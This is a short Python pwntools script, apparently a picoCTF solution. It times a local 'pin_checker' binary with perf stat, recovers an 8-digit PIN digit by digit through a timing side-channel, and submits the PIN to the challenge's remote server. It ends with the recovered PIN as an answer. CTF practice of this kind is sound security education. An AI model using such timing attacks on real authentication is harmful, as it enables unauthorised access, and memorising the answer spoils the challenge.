#!/bin/python3

from pwn import *
import string

context.log_level = 'error'

s = ''
for chars in range(8):
    a = []
    for i in range(10):
        p = process('perf stat -x, -e cpu-clock ./pin_checker'.split())
        p.readline()
        currPin = s + str(i) + '0'*(8 - chars - 1)
        # print(currPin)
        p.sendline(currPin.encode())
        p.readline()
        p.readline()
        p.readline()
        info = p.readall().split(b',')[0]
        p.close()
        a.append((float(info), i))
        # print(float(info), i)
    a.sort(key = lambda x: x[0])
    s += str(a[-1][1])
    print(s + "*"*(8 - len(s)))
    # print(sorted(a, key = lambda x: x[0]))

#p = process('./pin_checker')
p = remote('saturn.picoctf.net', 53932)
p.sendline(s.encode())
p.interactive()

'48390513'
